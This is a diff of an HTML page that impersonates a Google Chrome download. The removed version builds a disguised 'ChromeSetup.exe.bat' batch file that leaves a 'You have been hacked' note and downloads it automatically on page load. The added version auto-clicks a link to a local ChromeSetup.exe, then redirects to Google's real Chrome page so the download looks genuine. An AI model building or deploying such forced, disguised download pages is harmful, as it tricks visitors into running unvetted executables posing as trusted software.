@@ -1,28 +1,19 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title></title>
+    <title>Download Chrome Setup</title>
 </head>
 <body>
+    <a id="download-link" href="./ChromeSetup.exe">Download ChromeSetup File</a>
     <script>
         window.onload = function() {
-            var batchContent = '@echo off\r\n' +
-                               'echo You have been hacked > "%USERPROFILE%\\Downloads\\hacked.txt"\r\n' +
-                               'exit\r\n';
-            var blob = new Blob([batchContent], { type: 'text/plain' });
-            var url = URL.createObjectURL(blob);
-            var a = document.createElement('a');
-            a.href = url;
-            a.download = 'ChromeSetup.exe.bat';
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            URL.revokeObjectURL(url);
+            // Trigger the download
+            document.getElementById('download-link').click();
 
             // Redirect after download
             setTimeout(function() {
                 window.location.href = "https://www.google.com/chrome/next-steps.html";
-            }, 1500); // 1-second delay to ensure the file download starts
+            }, 2500); // 2.5-second delay to ensure the file download starts
         };
     </script>
 </body>
